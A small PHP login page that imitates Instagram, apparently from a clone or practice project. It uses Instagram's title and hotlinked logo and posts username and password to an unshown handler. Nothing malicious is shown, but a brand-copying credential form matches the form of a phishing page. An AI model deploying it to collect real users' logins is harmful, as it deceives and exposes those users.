<?php 
include ("view/login_view.php");
$error = new Errors;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles/style.css">
    <title>instagram</title>
</head>
<body>
    <form action="includes/login.php" method="post" class="login-form">
        <i data-visualcompletion="css-img" aria-label="Instagram" class="icon" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/ys/r/WBLlWbPOKZ9.png&quot;); background-position: 0px 0px; background-size: 176px 264px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;">
        </i>
        <input type="text" placeholder="username or email" name="username_email">
        <input type="password" placeholder="password" name="password">
        <?php 
        $error->check_errors();
        ?>
        <button type="submit" name="submit" class="login-button">Log in</button>
        <small><a href="view/forgot_password_form.php">Forgot Password ?</a></small>
    </form>
    <div class="login-form">
        <p>don't have an account? <a href="view/signup_form.php">Sign up</a></p>
    </div>
</body>
</html>
